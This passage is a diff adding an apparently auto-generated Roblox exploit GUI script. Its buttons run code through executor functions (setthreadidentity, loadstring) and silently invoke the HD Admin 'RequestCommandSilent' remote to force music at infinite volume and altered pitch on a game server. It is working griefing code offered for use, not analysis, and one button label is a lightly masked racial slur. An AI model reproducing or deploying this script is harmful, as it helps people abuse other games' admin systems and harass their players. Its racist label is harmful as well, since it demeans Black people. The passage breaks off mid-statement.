+HTT03["TextLabel_81"].ClipsDescendants = false
+HTT03["TextLabel_81"].Active = false
+HTT03["TextLabel_81"].Selectable = false
+HTT03["TextLabel_81"].Text = "play song"
+HTT03["TextLabel_81"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextLabel_81"].TextSize = 18
+HTT03["TextLabel_81"].TextTransparency = 0
+HTT03["TextLabel_81"].TextScaled = false
+HTT03["TextLabel_81"].TextWrapped = false
+HTT03["TextLabel_81"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextLabel_81"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextLabel_81"].Font = Enum.Font.Legacy
+HTT03["TextLabel_81"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextLabel_81"].TextStrokeTransparency = 1
+HTT03["TextLabel_81"].RichText = false
+-- Auto constraint "TextLabel"
+HTT03["UIAspectRatioConstraint_82"] = Instance.new("UIAspectRatioConstraint", HTT03["TextLabel_81"])
+HTT03["UIAspectRatioConstraint_82"].AspectRatio = 6.548387
+-- TextButton "TextButton"
+HTT03["TextButton_83"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_83"].Name = "TextButton"
+HTT03["TextButton_83"].Visible = true
+HTT03["TextButton_83"].ZIndex = 1
+HTT03["TextButton_83"].LayoutOrder = 0
+HTT03["TextButton_83"].Position = UDim2.new(0.000000,26,0.000000,639)
+HTT03["TextButton_83"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_83"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_83"].Rotation = 0
+HTT03["TextButton_83"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_83"].BackgroundTransparency = 0
+HTT03["TextButton_83"].BorderSizePixel = 3
+HTT03["TextButton_83"].BorderColor3 = Color3.fromRGB(11,0,255)
+HTT03["TextButton_83"].ClipsDescendants = false
+HTT03["TextButton_83"].Active = true
+HTT03["TextButton_83"].Selectable = true
+HTT03["TextButton_83"].AutoButtonColor = true
+HTT03["TextButton_83"].Modal = false
+HTT03["TextButton_83"].Text = "mat3lord song"
+HTT03["TextButton_83"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_83"].TextSize = 10
+HTT03["TextButton_83"].TextTransparency = 0
+HTT03["TextButton_83"].TextScaled = false
+HTT03["TextButton_83"].TextWrapped = false
+HTT03["TextButton_83"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_83"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_83"].Font = Enum.Font.Legacy
+HTT03["TextButton_83"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_83"].TextStrokeTransparency = 1
+HTT03["TextButton_83"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_84"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_83"])
+HTT03["UIAspectRatioConstraint_84"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_85"] = Instance.new("LocalScript")
+HTT03["LocalScript_85"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_85"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 1839272148 ;pitch 1 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_85"].Parent = HTT03["TextButton_83"]
+    if HTT03["LocalScript_85"]:IsA("BaseScript") then HTT03["LocalScript_85"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 1839272148 ;pitch 1 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 1839272148 ;pitch 1 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_85"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_86"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_86"].Name = "TextButton"
+HTT03["TextButton_86"].Visible = true
+HTT03["TextButton_86"].ZIndex = 1
+HTT03["TextButton_86"].LayoutOrder = 0
+HTT03["TextButton_86"].Position = UDim2.new(0.000000,197,0.000000,639)
+HTT03["TextButton_86"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_86"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_86"].Rotation = 0
+HTT03["TextButton_86"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_86"].BackgroundTransparency = 0
+HTT03["TextButton_86"].BorderSizePixel = 3
+HTT03["TextButton_86"].BorderColor3 = Color3.fromRGB(0,17,255)
+HTT03["TextButton_86"].ClipsDescendants = false
+HTT03["TextButton_86"].Active = true
+HTT03["TextButton_86"].Selectable = true
+HTT03["TextButton_86"].AutoButtonColor = true
+HTT03["TextButton_86"].Modal = false
+HTT03["TextButton_86"].Text = "legecy ver"
+HTT03["TextButton_86"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_86"].TextSize = 10
+HTT03["TextButton_86"].TextTransparency = 0
+HTT03["TextButton_86"].TextScaled = false
+HTT03["TextButton_86"].TextWrapped = false
+HTT03["TextButton_86"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_86"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_86"].Font = Enum.Font.Legacy
+HTT03["TextButton_86"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_86"].TextStrokeTransparency = 1
+HTT03["TextButton_86"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_87"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_86"])
+HTT03["UIAspectRatioConstraint_87"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_88"] = Instance.new("LocalScript")
+HTT03["LocalScript_88"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_88"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 8680587619 ;pitch 1 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_88"].Parent = HTT03["TextButton_86"]
+    if HTT03["LocalScript_88"]:IsA("BaseScript") then HTT03["LocalScript_88"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 8680587619 ;pitch 1 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 8680587619 ;pitch 1 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_88"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_89"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_89"].Name = "TextButton"
+HTT03["TextButton_89"].Visible = true
+HTT03["TextButton_89"].ZIndex = 1
+HTT03["TextButton_89"].LayoutOrder = 0
+HTT03["TextButton_89"].Position = UDim2.new(0.000000,364,0.000000,639)
+HTT03["TextButton_89"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_89"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_89"].Rotation = 0
+HTT03["TextButton_89"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_89"].BackgroundTransparency = 0
+HTT03["TextButton_89"].BorderSizePixel = 3
+HTT03["TextButton_89"].BorderColor3 = Color3.fromRGB(0,5,255)
+HTT03["TextButton_89"].ClipsDescendants = false
+HTT03["TextButton_89"].Active = true
+HTT03["TextButton_89"].Selectable = true
+HTT03["TextButton_89"].AutoButtonColor = true
+HTT03["TextButton_89"].Modal = false
+HTT03["TextButton_89"].Text = "Java1x3x5x6 song"
+HTT03["TextButton_89"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_89"].TextSize = 10
+HTT03["TextButton_89"].TextTransparency = 0
+HTT03["TextButton_89"].TextScaled = false
+HTT03["TextButton_89"].TextWrapped = false
+HTT03["TextButton_89"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_89"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_89"].Font = Enum.Font.Legacy
+HTT03["TextButton_89"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_89"].TextStrokeTransparency = 1
+HTT03["TextButton_89"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_90"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_89"])
+HTT03["UIAspectRatioConstraint_90"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_91"] = Instance.new("LocalScript")
+HTT03["LocalScript_91"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_91"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 113271702672542")
+	RequestCommand:InvokeServer(";pitch 0.18")
+	RequestCommand:InvokeServer(";volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_91"].Parent = HTT03["TextButton_89"]
+    if HTT03["LocalScript_91"]:IsA("BaseScript") then HTT03["LocalScript_91"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 113271702672542")
+	RequestCommand:InvokeServer(";pitch 0.18")
+	RequestCommand:InvokeServer(";volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 113271702672542")
+	RequestCommand:InvokeServer(";pitch 0.18")
+	RequestCommand:InvokeServer(";volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_91"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_92"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_92"].Name = "TextButton"
+HTT03["TextButton_92"].Visible = true
+HTT03["TextButton_92"].ZIndex = 1
+HTT03["TextButton_92"].LayoutOrder = 0
+HTT03["TextButton_92"].Position = UDim2.new(0.000000,26,0.000000,716)
+HTT03["TextButton_92"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_92"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_92"].Rotation = 0
+HTT03["TextButton_92"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_92"].BackgroundTransparency = 0
+HTT03["TextButton_92"].BorderSizePixel = 3
+HTT03["TextButton_92"].BorderColor3 = Color3.fromRGB(11,0,255)
+HTT03["TextButton_92"].ClipsDescendants = false
+HTT03["TextButton_92"].Active = true
+HTT03["TextButton_92"].Selectable = true
+HTT03["TextButton_92"].AutoButtonColor = true
+HTT03["TextButton_92"].Modal = false
+HTT03["TextButton_92"].Text = "yo maker loop"
+HTT03["TextButton_92"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_92"].TextSize = 8
+HTT03["TextButton_92"].TextTransparency = 0
+HTT03["TextButton_92"].TextScaled = false
+HTT03["TextButton_92"].TextWrapped = false
+HTT03["TextButton_92"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_92"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_92"].Font = Enum.Font.Legacy
+HTT03["TextButton_92"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_92"].TextStrokeTransparency = 1
+HTT03["TextButton_92"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_93"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_92"])
+HTT03["UIAspectRatioConstraint_93"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_94"] = Instance.new("LocalScript")
+HTT03["LocalScript_94"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_94"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 5356466111 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_94"].Parent = HTT03["TextButton_92"]
+    if HTT03["LocalScript_94"]:IsA("BaseScript") then HTT03["LocalScript_94"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 5356466111 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 5356466111 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_94"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_95"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_95"].Name = "TextButton"
+HTT03["TextButton_95"].Visible = true
+HTT03["TextButton_95"].ZIndex = 1
+HTT03["TextButton_95"].LayoutOrder = 0
+HTT03["TextButton_95"].Position = UDim2.new(0.000000,197,0.000000,713)
+HTT03["TextButton_95"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_95"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_95"].Rotation = 0
+HTT03["TextButton_95"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_95"].BackgroundTransparency = 0
+HTT03["TextButton_95"].BorderSizePixel = 3
+HTT03["TextButton_95"].BorderColor3 = Color3.fromRGB(29,0,255)
+HTT03["TextButton_95"].ClipsDescendants = false
+HTT03["TextButton_95"].Active = true
+HTT03["TextButton_95"].Selectable = true
+HTT03["TextButton_95"].AutoButtonColor = true
+HTT03["TextButton_95"].Modal = false
+HTT03["TextButton_95"].Text = "original sparta"
+HTT03["TextButton_95"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_95"].TextSize = 10
+HTT03["TextButton_95"].TextTransparency = 0
+HTT03["TextButton_95"].TextScaled = false
+HTT03["TextButton_95"].TextWrapped = false
+HTT03["TextButton_95"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_95"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_95"].Font = Enum.Font.Legacy
+HTT03["TextButton_95"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_95"].TextStrokeTransparency = 1
+HTT03["TextButton_95"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_96"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_95"])
+HTT03["UIAspectRatioConstraint_96"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_97"] = Instance.new("LocalScript")
+HTT03["LocalScript_97"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_97"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 140240856766854 ;pitch 0.22 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_97"].Parent = HTT03["TextButton_95"]
+    if HTT03["LocalScript_97"]:IsA("BaseScript") then HTT03["LocalScript_97"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 140240856766854 ;pitch 0.22 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 140240856766854 ;pitch 0.22 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_97"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_98"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_98"].Name = "TextButton"
+HTT03["TextButton_98"].Visible = true
+HTT03["TextButton_98"].ZIndex = 1
+HTT03["TextButton_98"].LayoutOrder = 0
+HTT03["TextButton_98"].Position = UDim2.new(0.000000,363,0.000000,708)
+HTT03["TextButton_98"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_98"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_98"].Rotation = 0
+HTT03["TextButton_98"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_98"].BackgroundTransparency = 0
+HTT03["TextButton_98"].BorderSizePixel = 3
+HTT03["TextButton_98"].BorderColor3 = Color3.fromRGB(11,0,255)
+HTT03["TextButton_98"].ClipsDescendants = false
+HTT03["TextButton_98"].Active = true
+HTT03["TextButton_98"].Selectable = true
+HTT03["TextButton_98"].AutoButtonColor = true
+HTT03["TextButton_98"].Modal = false
+HTT03["TextButton_98"].Text = "idk song 😭"
+HTT03["TextButton_98"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_98"].TextSize = 10
+HTT03["TextButton_98"].TextTransparency = 0
+HTT03["TextButton_98"].TextScaled = false
+HTT03["TextButton_98"].TextWrapped = false
+HTT03["TextButton_98"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_98"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_98"].Font = Enum.Font.Legacy
+HTT03["TextButton_98"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_98"].TextStrokeTransparency = 1
+HTT03["TextButton_98"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_99"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_98"])
+HTT03["UIAspectRatioConstraint_99"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_100"] = Instance.new("LocalScript")
+HTT03["LocalScript_100"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_100"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 87175996903523 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_100"].Parent = HTT03["TextButton_98"]
+    if HTT03["LocalScript_100"]:IsA("BaseScript") then HTT03["LocalScript_100"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 87175996903523 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";music 87175996903523 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_100"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_101"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_101"].Name = "TextButton"
+HTT03["TextButton_101"].Visible = true
+HTT03["TextButton_101"].ZIndex = 1
+HTT03["TextButton_101"].LayoutOrder = 0
+HTT03["TextButton_101"].Position = UDim2.new(0.000000,27,0.000000,792)
+HTT03["TextButton_101"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_101"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_101"].Rotation = 0
+HTT03["TextButton_101"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_101"].BackgroundTransparency = 0
+HTT03["TextButton_101"].BorderSizePixel = 3
+HTT03["TextButton_101"].BorderColor3 = Color3.fromRGB(0,17,255)
+HTT03["TextButton_101"].ClipsDescendants = false
+HTT03["TextButton_101"].Active = true
+HTT03["TextButton_101"].Selectable = true
+HTT03["TextButton_101"].AutoButtonColor = true
+HTT03["TextButton_101"].Modal = false
+HTT03["TextButton_101"].Text = "black ni##er"
+HTT03["TextButton_101"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_101"].TextSize = 10
+HTT03["TextButton_101"].TextTransparency = 0
+HTT03["TextButton_101"].TextScaled = false
+HTT03["TextButton_101"].TextWrapped = false
+HTT03["TextButton_101"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_101"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_101"].Font = Enum.Font.Legacy
+HTT03["TextButton_101"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_101"].TextStrokeTransparency = 1
+HTT03["TextButton_101"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_102"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_101"])
+HTT03["UIAspectRatioConstraint_102"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_103"] = Instance.new("LocalScript")
+HTT03["LocalScript_103"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_103"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 8704602135 ;pitch 1 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_103"].Parent = HTT03["TextButton_101"]
+    if HTT03["LocalScript_103"]:IsA("BaseScript") then HTT03["LocalScript_103"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 8704602135 ;pitch 1 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 8704602135 ;pitch 1 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_103"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_104"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_104"].Name = "TextButton"
+HTT03["TextButton_104"].Visible = true
+HTT03["TextButton_104"].ZIndex = 1
+HTT03["TextButton_104"].LayoutOrder = 0
+HTT03["TextButton_104"].Position = UDim2.new(0.000000,198,0.000000,793)
+HTT03["TextButton_104"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_104"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_104"].Rotation = 0
+HTT03["TextButton_104"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_104"].BackgroundTransparency = 0
+HTT03["TextButton_104"].BorderSizePixel = 3
+HTT03["TextButton_104"].BorderColor3 = Color3.fromRGB(59,0,255)
+HTT03["TextButton_104"].ClipsDescendants = false
+HTT03["TextButton_104"].Active = true
+HTT03["TextButton_104"].Selectable = true
+HTT03["TextButton_104"].AutoButtonColor = true
+HTT03["TextButton_104"].Modal = false
+HTT03["TextButton_104"].Text = "chaos"
+HTT03["TextButton_104"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_104"].TextSize = 10
+HTT03["TextButton_104"].TextTransparency = 0
+HTT03["TextButton_104"].TextScaled = false
+HTT03["TextButton_104"].TextWrapped = false
+HTT03["TextButton_104"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_104"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_104"].Font = Enum.Font.Legacy
+HTT03["TextButton_104"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_104"].TextStrokeTransparency = 1
+HTT03["TextButton_104"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_105"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_104"])
+HTT03["UIAspectRatioConstraint_105"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_106"] = Instance.new("LocalScript")
+HTT03["LocalScript_106"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_106"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 1843497734 ;pitch 0.6 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_106"].Parent = HTT03["TextButton_104"]
+    if HTT03["LocalScript_106"]:IsA("BaseScript") then HTT03["LocalScript_106"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 1843497734 ;pitch 0.6 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
